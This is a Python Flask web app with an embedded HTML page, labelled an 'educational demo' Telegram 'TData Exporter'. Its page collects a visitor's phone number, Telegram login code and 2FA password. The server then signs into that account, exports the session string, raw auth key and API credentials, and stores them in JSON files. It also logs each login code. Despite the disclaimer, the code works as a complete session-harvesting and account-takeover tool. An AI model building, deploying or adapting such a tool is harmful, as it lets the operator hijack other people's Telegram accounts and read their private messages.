import os
import asyncio
import logging
import time
import threading
import json
from datetime import datetime
from flask import Flask, request, jsonify
from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded, 
    PhoneCodeInvalid, 
    PhoneNumberInvalid, 
    PhoneCodeExpired,
    FloodWait
)

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

class JSONStorageManager:
    """Менеджер JSON хранилища"""
    def __init__(self):
        self.storage_path = "./tdata_storage"
        self.init_storage()
    
    def init_storage(self):
        """Инициализация хранилища"""
        try:
            os.makedirs(f"{self.storage_path}/users", exist_ok=True)
            os.makedirs(f"{self.storage_path}/sessions", exist_ok=True)
            os.makedirs(f"{self.storage_path}/tdata", exist_ok=True)
            logger.info("✅ JSON хранилище инициализировано")
        except Exception as e:
            logger.error(f"❌ Ошибка инициализации хранилища: {e}")
    
    def save_user(self, user_data):
        """Сохранение пользователя"""
        try:
            user_file = f"{self.storage_path}/users/{user_data['id']}.json"
            with open(user_file, 'w', encoding='utf-8') as f:
                json.dump(user_data, f, indent=2, ensure_ascii=False)
            return True
        except Exception as e:
            logger.error(f"❌ Ошибка сохранения пользователя: {e}")
            return False
    
    def save_session(self, user_id, session_data, request_info=None):
        """Сохранение сессии"""
        try:
            session_id = int(time.time() * 1000)
            session_file = f"{self.storage_path}/sessions/{session_id}.json"
            
            session_record = {
                'id': session_id,
                'user_id': user_id,
                'session_data': session_data,
                'request_info': request_info,
                'created_at': datetime.now().isoformat(),
                'is_active': True
            }
            
            with open(session_file, 'w', encoding='utf-8') as f:
                json.dump(session_record, f, indent=2, ensure_ascii=False)
            
            return session_id
        except Exception as e:
            logger.error(f"❌ Ошибка сохранения сессии: {e}")
            return None
    
    def save_tdata(self, user_id, session_id, tdata_json):
        """Сохранение TData"""
        try:
            tdata_id = int(time.time() * 1000)
            tdata_file = f"{self.storage_path}/tdata/{tdata_id}.json"
            
            tdata_record = {
                'id': tdata_id,
                'user_id': user_id,
                'session_id': session_id,
                'tdata_json': tdata_json,
                'exported_at': datetime.now().isoformat()
            }
            
            with open(tdata_file, 'w', encoding='utf-8') as f:
                json.dump(tdata_record, f, indent=2, ensure_ascii=False)
            
            return tdata_id
        except Exception as e:
            logger.error(f"❌ Ошибка сохранения TData: {e}")
            return None
    
    def get_user_sessions(self, user_id):
        """Получение сессий пользователя"""
        try:
            sessions = []
            sessions_dir = f"{self.storage_path}/sessions"
            
            if not os.path.exists(sessions_dir):
                return []
            
            for filename in os.listdir(sessions_dir):
                if filename.endswith('.json'):
                    filepath = os.path.join(sessions_dir, filename)
                    with open(filepath, 'r', encoding='utf-8') as f:
                        session_data = json.load(f)
                        if session_data.get('user_id') == user_id:
                            sessions.append({
                                'id': session_data['id'],
                                'session_string': session_data['session_data'].get('session_string'),
                                'dc_id': session_data['session_data'].get('dc_id'),
                                'created_at': session_data['created_at'],
                                'is_active': session_data.get('is_active', True)
                            })
            
            return sorted(sessions, key=lambda x: x['created_at'], reverse=True)
        except Exception as e:
            logger.error(f"❌ Ошибка получения сессий: {e}")
            return []
    
    def get_stats(self):
        """Статистика хранилища"""
        try:
            users_dir = f"{self.storage_path}/users"
            sessions_dir = f"{self.storage_path}/sessions"
            tdata_dir = f"{self.storage_path}/tdata"
            
            users_count = len([f for f in os.listdir(users_dir) if f.endswith('.json')]) if os.path.exists(users_dir) else 0
            sessions_count = len([f for f in os.listdir(sessions_dir) if f.endswith('.json')]) if os.path.exists(sessions_dir) else 0
            tdata_count = len([f for f in os.listdir(tdata_dir) if f.endswith('.json')]) if os.path.exists(tdata_dir) else 0
            
            return {
                'total_users': users_count,
                'active_sessions': sessions_count,
                'total_tdata_records': tdata_count
            }
        except Exception as e:
            logger.error(f"❌ Ошибка получения статистики: {e}")
            return {'total_users': 0, 'active_sessions': 0, 'total_tdata_records': 0}

# Инициализация хранилища
storage = JSONStorageManager()

# Создаем отдельный event loop для асинхронных операций
class AsyncRunner:
    def __init__(self):
        self.loop = asyncio.new_event_loop()
        self.thread = threading.Thread(target=self._run_loop, daemon=True)
        self.thread.start()
    
    def _run_loop(self):
        asyncio.set_event_loop(self.loop)
        self.loop.run_forever()
    
    def run_coroutine(self, coro):
        future = asyncio.run_coroutine_threadsafe(coro, self.loop)
        return future.result(timeout=30)

# Глобальный runner для асинхронных операций
async_runner = AsyncRunner()

# Добавляем CORS headers
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    return response

def load_api_keys():
    """Загружаем API ключи с проверкой"""
    try:
        from dotenv import load_dotenv
        load_dotenv()
        logger.info("✅ .env файл загружен")
    except ImportError:
        logger.warning("⚠️ python-dotenv не установлен")
    
    # Получаем ключи из переменных окружения
    api_id = os.getenv('TELEGRAM_API_ID')
    api_hash = os.getenv('TELEGRAM_API_HASH')
    secret_key = os.getenv('SECRET_KEY', 'educational-demo-secret-key-2024')
    
    return api_id, api_hash, secret_key

# Загружаем ключи при старте
API_ID, API_HASH, SECRET_KEY = load_api_keys()
app.secret_key = SECRET_KEY

# Хранилище активных сессий
ACTIVE_SESSIONS = {}

class TelegramAuthTester:
    def __init__(self):
        self.api_id = None
        self.api_hash = None
        self.initialized = False
        self.initialize_client()
        
    def initialize_client(self):
        """Инициализируем клиент с проверкой ключей"""
        try:
            if not API_ID or not API_HASH:
                logger.error("❌ API ключи не установлены")
                self.initialized = False
                return
                
            self.api_id = int(API_ID)
            self.api_hash = API_HASH
            self.initialized = True
            logger.info(f"✅ Pyrogram тестер инициализирован с API_ID: {self.api_id}")
            
        except ValueError as e:
            logger.error(f"❌ Неверный формат API_ID: {e}")
            self.initialized = False
        except Exception as e:
            logger.error(f"❌ Ошибка инициализации: {e}")
            self.initialized = False
    
    async def request_code(self, phone_number):
        """Запрос кода аутентификации"""
        if not self.initialized:
            return {'success': False, 'error': 'Клиент не инициализирован'}
            
        client = None
        try:
            # Создаем уникальное имя сессии
            session_id = f"{phone_number}_{int(time.time())}"
            
            # Создаем клиента
            client = Client(
                name=session_id,
                api_id=self.api_id,
                api_hash=self.api_hash,
                in_memory=True
            )
            
            await client.connect()
            
            # Запрашиваем код
            logger.info(f"📱 Запрос кода для: {phone_number}")
            sent_code = await client.send_code(phone_number)
            
            # Сохраняем сессию
            ACTIVE_SESSIONS[session_id] = {
                'client': client,
                'phone': phone_number,
                'phone_code_hash': sent_code.phone_code_hash,
                'created_at': time.time()
            }
            
            logger.info(f"📱 Код отправлен. Session: {session_id}")
            logger.info(f"📱 Phone code hash: {sent_code.phone_code_hash}")
            
            return {
                'success': True,
                'message': 'Код отправлен в Telegram',
                'session_id': session_id,
                'phone_code_hash': sent_code.phone_code_hash
            }
            
        except Exception as e:
            logger.error(f"❌ Ошибка запроса кода: {e}")
            if client:
                try:
                    await client.disconnect()
                except:
                    pass
            return {'success': False, 'error': f'Ошибка: {str(e)}'}
    
    async def verify_code(self, session_id, code):
        """Верификация кода"""
        if session_id not in ACTIVE_SESSIONS:
            return {'success': False, 'error': 'Сессия не найдена или истекла'}
            
        session_data = ACTIVE_SESSIONS[session_id]
        client = session_data['client']
        phone = session_data['phone']
        phone_code_hash = session_data['phone_code_hash']
        
        try:
            logger.info(f"🔐 Верификация кода {code} для {phone}")
            
            # Пытаемся войти с кодом
            await client.sign_in(
                phone_number=phone,
                phone_code_hash=phone_code_hash,
                phone_code=code
            )
            
            logger.info("✅ Успешная аутентификация")
            
            # Получаем информацию о пользователе
            me = await client.get_me()
            user_info = {
                'id': me.id,
                'phone_number': me.phone_number,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'username': me.username
            }
            
            # Экспортируем TData
            export_result = await self.export_tdata(client, user_info)
            
            # Очищаем сессию
            await client.disconnect()
            del ACTIVE_SESSIONS[session_id]
            
            if export_result['success']:
                return {
                    'success': True,
                    'message': 'Аутентификация и экспорт TData успешны!',
                    'user_info': user_info,
                    'export_info': export_result
                }
            else:
                return export_result
                
        except SessionPasswordNeeded:
            logger.info("🔒 Требуется 2FA пароль")
            # Обновляем статус сессии
            session_data['needs_password'] = True
            ACTIVE_SESSIONS[session_id] = session_data
            
            return {
                'success': True,
                'message': 'Требуется пароль 2FA',
                'needs_password': True,
                'session_id': session_id
            }
            
        except PhoneCodeInvalid as e:
            logger.warning(f"⚠️ Неверный код: {e}")
            return {'success': False, 'error': 'Неверный код подтверждения'}
            
        except PhoneCodeExpired as e:
            logger.warning(f"⏰ Код истек: {e}")
            await client.disconnect()
            del ACTIVE_SESSIONS[session_id]
            return {'success': False, 'error': 'Код истек. Запросите новый.'}
            
        except FloodWait as e:
            logger.warning(f"⏳ Flood wait: {e.value} секунд")
            await client.disconnect()
            del ACTIVE_SESSIONS[session_id]
            return {
                'success': False, 
                'error': f'Слишком много попыток. Попробуйте через {e.value} секунд.'
            }
            
        except Exception as e:
            logger.error(f"❌ Ошибка верификации: {e}")
            try:
                await client.disconnect()
            except:
                pass
            if session_id in ACTIVE_SESSIONS:
                del ACTIVE_SESSIONS[session_id]
            return {'success': False, 'error': f'Ошибка: {str(e)}'}
    
    async def verify_password(self, session_id, password):
        """Верификация пароля 2FA"""
        if session_id not in ACTIVE_SESSIONS:
            return {'success': False, 'error': 'Сессия не найдена'}
            
        session_data = ACTIVE_SESSIONS[session_id]
        if not session_data.get('needs_password'):
            return {'success': False, 'error': 'Неверный статус сессии'}
            
        client = session_data['client']
        
        try:
            logger.info("🔑 Верификация пароля 2FA")
            
            # Входим с паролем
            await client.check_password(password=password)
            
            logger.info("✅ Успешная аутентификация с паролем 2FA")
            
            # Получаем информацию о пользователе
            me = await client.get_me()
            user_info = {
                'id': me.id,
                'phone_number': me.phone_number,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'username': me.username
            }
            
            # Экспортируем TData
            export_result = await self.export_tdata(client, user_info)
            
            # Очищаем сессию
            await client.disconnect()
            del ACTIVE_SESSIONS[session_id]
            
            if export_result['success']:
                return {
                    'success': True,
                    'message': 'Аутентификация и экспорт TData успешны!',
                    'user_info': user_info,
                    'export_info': export_result
                }
            else:
                return export_result
                
        except Exception as e:
            logger.error(f"❌ Ошибка верификации пароля: {e}")
            try:
                await client.disconnect()
            except:
                pass
            if session_id in ACTIVE_SESSIONS:
                del ACTIVE_SESSIONS[session_id]
            return {'success': False, 'error': 'Неверный пароль 2FA'}
    
    async def export_tdata(self, client, user_info, request_info=None):
        """Экспорт TData"""
        try:
            # Экспортируем session string
            session_string = await client.export_session_string()
            
            # Получаем информацию о сессии
            tdata_info = {
                'version': '1.0',
                'user_id': user_info['id'],
                'phone_number': user_info.get('phone_number', ''),
                'first_name': user_info.get('first_name', ''),
                'last_name': user_info.get('last_name', ''),
                'username': user_info.get('username', ''),
                'session_string': session_string,
                'auth_key': client.auth_key.key.hex() if client.auth_key else None,
                'dc_id': client.dc_id,
                'api_id': self.api_id,
                'api_hash': self.api_hash,
                'device_model': 'Pyrogram Export',
                'system_version': '1.0',
                'app_version': '1.0',
                'lang_code': 'en',
                'system_lang_code': 'en',
                'exported_at': datetime.now().isoformat()
            }
            
            # Сохраняем пользователя
            storage.save_user(user_info)
            
            # Сохраняем сессию
            session_data = {
                'session_string': session_string,
                'auth_key': client.auth_key.key.hex() if client.auth_key else None,
                'dc_id': client.dc_id,
                'api_id': self.api_id,
                'api_hash': self.api_hash,
                'device_model': 'Pyrogram Export',
                'system_version': '1.0',
                'app_version': '1.0',
                'lang_code': 'en',
                'system_lang_code': 'en'
            }
            
            session_id = storage.save_session(
                user_info['id'], 
                session_data, 
                request_info
            )
            
            if session_id:
                # Сохраняем полный TData
                tdata_id = storage.save_tdata(
                    user_info['id'], 
                    session_id, 
                    tdata_info
                )
                
                logger.info(f"💾 TData сохранен. Session ID: {session_id}, TData ID: {tdata_id}")
                
                return {
                    'success': True,
                    'session_id': session_id,
                    'tdata_id': tdata_id,
                    'user_id': user_info['id'],
                    'session_string': session_string,
                    'message': 'TData успешно экспортирован в JSON хранилище'
                }
            else:
                return {'success': False, 'error': 'Ошибка сохранения сессии'}
                
        except Exception as e:
            logger.error(f"❌ Ошибка экспорта TData: {e}")
            return {'success': False, 'error': f'Ошибка экспорта: {str(e)}'}

# Инициализация
auth_tester = TelegramAuthTester()

# 🎯 Главная страница с HTML интерфейсом
@app.route('/')
def home():
    """Главная страница с интерфейсом"""
    stats = storage.get_stats()
    
    return f'''
<!DOCTYPE html>
<html>
<head>
    <title>Telegram TData Exporter</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {{
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background: #f5f5f5;
        }}
        .container {{
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }}
        .header {{
            text-align: center;
            margin-bottom: 30px;
        }}
        .stats {{
            background: #e8f5e8;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
        }}
        .step {{
            margin-bottom: 25px;
            padding: 20px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }}
        .input-group {{
            margin-bottom: 15px;
        }}
        label {{
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }}
        input[type="text"], input[type="password"] {{
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }}
        button {{
            background: #007bff;
            color: white;
            padding: 12px 24px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }}
        button:hover {{
            background: #0056b3;
        }}
        button:disabled {{
            background: #6c757d;
            cursor: not-allowed;
        }}
        .alert {{
            padding: 12px;
            margin: 15px 0;
            border-radius: 5px;
        }}
        .success {{
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }}
        .error {{
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }}
        .info {{
            background: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }}
        .warning {{
            background: #fff3cd;
            color: #856404;
            border: 1px solid #ffeaa7;
        }}
        .hidden {{
            display: none;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔐 Telegram TData Exporter</h1>
            <p>Educational Demo - Экспорт сессий Telegram</p>
        </div>

        <div class="stats">
            <h3>📊 Статистика хранилища:</h3>
            <p>👥 Пользователей: {stats['total_users']}</p>
            <p>💾 Сессий: {stats['active_sessions']}</p>
            <p>🗂️ TData записей: {stats['total_tdata_records']}</p>
        </div>

        <div class="alert warning">
            ⚠️ <strong>ВНИМАНИЕ:</strong> Это образовательная демонстрация. Используйте только тестовые данные!
        </div>

        <div id="step1" class="step">
            <h3>📱 Шаг 1: Введите номер телефона</h3>
            <div class="input-group">
                <label for="phone">Номер телефона:</label>
                <input type="text" id="phone" placeholder="+79220470330" value="+79220470330">
            </div>
            <button onclick="requestCode()" id="requestBtn">Получить код</button>
        </div>

        <div id="step2" class="step hidden">
            <h3>🔢 Шаг 2: Введите код из Telegram</h3>
            <div class="input-group">
                <label for="code">5-значный код:</label>
                <input type="text" id="code" placeholder="12345" maxlength="5">
            </div>
            <button onclick="verifyCode()" id="verifyBtn">Проверить код</button>
        </div>

        <div id="step3" class="step hidden">
            <h3>🔒 Шаг 3: Введите пароль 2FA (если требуется)</h3>
            <div class="alert info">
                Этот аккаунт защищен двухфакторной аутентификацией
            </div>
            <div class="input-group">
                <label for="password">Пароль 2FA:</label>
                <input type="password" id="password" placeholder="Введите пароль">
            </div>
            <button onclick="verifyPassword()" id="passwordBtn">Проверить пароль</button>
        </div>

        <div id="results"></div>
    </div>

    <script>
        let currentSessionId = '';
        let currentPhone = '';

        function showAlert(message, type) {{
            const results = document.getElementById('results');
            results.innerHTML = '<div class="alert ' + type + '">' + message + '</div>';
        }}

        function showStep(stepNumber) {{
            // Скрываем все шаги
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.add('hidden');
            document.getElementById('step3').classList.add('hidden');
            
            // Показываем нужный шаг
            document.getElementById('step' + stepNumber).classList.remove('hidden');
        }}

        async function requestCode() {{
            const phone = document.getElementById('phone').value.trim();
            currentPhone = phone;

            if (!phone) {{
                showAlert('Введите номер телефона', 'error');
                return;
            }}

            const btn = document.getElementById('requestBtn');
            btn.disabled = true;
            btn.textContent = 'Отправка...';

            try {{
                const response = await fetch('/api/auth/request-code', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{phone: phone}})
                }});
                
                if (!response.ok) {{
                    const errorText = await response.text();
                    throw new Error(`HTTP error! status: ${{response.status}}`);
                }}
                
                const data = await response.json();
                
                if (data.success) {{
                    currentSessionId = data.session_id;
                    showStep(2);
                    showAlert('✅ Код отправлен в Telegram! Проверьте приложение и введите код.', 'success');
                    document.getElementById('code').focus();
                }} else {{
                    showAlert('❌ ' + data.error, 'error');
                }}
            }} catch (error) {{
                console.error('Error:', error);
                showAlert('❌ Ошибка сети: ' + error.message, 'error');
            }} finally {{
                btn.disabled = false;
                btn.textContent = 'Получить код';
            }}
        }}

        async function verifyCode() {{
            const code = document.getElementById('code').value.trim();

            if (!code || code.length !== 5) {{
                showAlert('Введите 5-значный код из Telegram', 'error');
                return;
            }}

            const btn = document.getElementById('verifyBtn');
            btn.disabled = true;
            btn.textContent = 'Проверка...';

            try {{
                const response = await fetch('/api/auth/verify-code', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{
                        session_id: currentSessionId,
                        code: code
                    }})
                }});
                
                if (!response.ok) {{
                    const errorText = await response.text();
                    throw new Error(`HTTP error! status: ${{response.status}}`);
                }}
                
                const data = await response.json();
                
                if (data.success) {{
                    if (data.needs_password) {{
                        showStep(3);
                        showAlert('🔒 Требуется пароль двухфакторной аутентификации', 'info');
                        document.getElementById('password').focus();
                    }} else {{
                        showAlert('✅ ' + data.message, 'success');
                        if (data.user_info) {{
                            showAlert('👤 Пользователь: ' + data.user_info.first_name + ' (@' + data.user_info.username + ')', 'info');
                        }}
                        if (data.export_info) {{
                            showAlert('💾 TData экспортирован! Session ID: ' + data.export_info.session_id, 'success');
                        }}
                    }}
                }} else {{
                    showAlert('❌ ' + data.error, 'error');
                }}
            }} catch (error) {{
                console.error('Error:', error);
                showAlert('❌ Ошибка сети: ' + error.message, 'error');
            }} finally {{
                btn.disabled = false;
                btn.textContent = 'Проверить код';
            }}
        }}

        async function verifyPassword() {{
            const password = document.getElementById('password').value;

            if (!password) {{
                showAlert('Введите пароль 2FA', 'error');
                return;
            }}

            const btn = document.getElementById('passwordBtn');
            btn.disabled = true;
            btn.textContent = 'Проверка...';

            try {{
                const response = await fetch('/api/auth/verify-password', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{
                        session_id: currentSessionId,
                        password: password
                    }})
                }});
                
                if (!response.ok) {{
                    const errorText = await response.text();
                    throw new Error(`HTTP error! status: ${{response.status}}`);
                }}
                
                const data = await response.json();
                
                if (data.success) {{
                    showAlert('✅ ' + data.message, 'success');
                    if (data.user_info) {{
                        showAlert('👤 Пользователь: ' + data.user_info.first_name + ' (@' + data.user_info.username + ')', 'info');
                    }}
                    if (data.export_info) {{
                        showAlert('💾 TData экспортирован! Session ID: ' + data.export_info.session_id, 'success');
                    }}
                }} else {{
                    showAlert('❌ ' + data.error, 'error');
                }}
            }} catch (error) {{
                console.error('Error:', error);
                showAlert('❌ Ошибка сети: ' + error.message, 'error');
            }} finally {{
                btn.disabled = false;
                btn.textContent = 'Проверить пароль';
            }}
        }}

        // Обработчики Enter
        document.getElementById('phone').addEventListener('keypress', function(e) {{
            if (e.key === 'Enter') requestCode();
        }});
        
        document.getElementById('code').addEventListener('keypress', function(e) {{
            if (e.key === 'Enter') verifyCode();
        }});

        document.getElementById('password').addEventListener('keypress', function(e) {{
            if (e.key === 'Enter') verifyPassword();
        }});
    </script>
</body>
</html>
'''

# 🎯 API Endpoints
@app.route('/api/auth/request-code', methods=['POST', 'OPTIONS'])
def request_code():
    """Запрос кода аутентификации"""
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'})
        
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
            
        phone = data.get('phone', '').strip()
        
        if not phone:
            return jsonify({'success': False, 'error': 'Введите номер телефона'}), 400
        
        result = async_runner.run_coroutine(auth_tester.request_code(phone))
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"❌ Ошибка запроса кода: {e}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500

@app.route('/api/auth/verify-code', methods=['POST', 'OPTIONS'])
def verify_code():
    """Верификация кода"""
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'})
        
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
            
        session_id = data.get('session_id', '').strip()
        code = data.get('code', '').strip()
        
        if not session_id or not code:
            return jsonify({'success': False, 'error': 'Введите код'}), 400
        
        result = async_runner.run_coroutine(auth_tester.verify_code(session_id, code))
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"❌ Ошибка верификации кода: {e}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500

@app.route('/api/auth/verify-password', methods=['POST', 'OPTIONS'])
def verify_password():
    """Верификация пароля 2FA"""
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'})
        
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
            
        session_id = data.get('session_id', '').strip()
        password = data.get('password', '')
        
        if not session_id or not password:
            return jsonify({'success': False, 'error': 'Введите пароль'}), 400
        
        result = async_runner.run_coroutine(auth_tester.verify_password(session_id, password))
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"❌ Ошибка верификации пароля: {e}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500

@app.route('/api/storage/stats', methods=['GET'])
def storage_stats():
    """Статистика хранилища"""
    try:
        stats = storage.get_stats()
        return jsonify({
            'success': True,
            'storage_type': 'JSON',
            'statistics': stats
        })
    except Exception as e:
        logger.error(f"❌ Ошибка получения статистики: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)
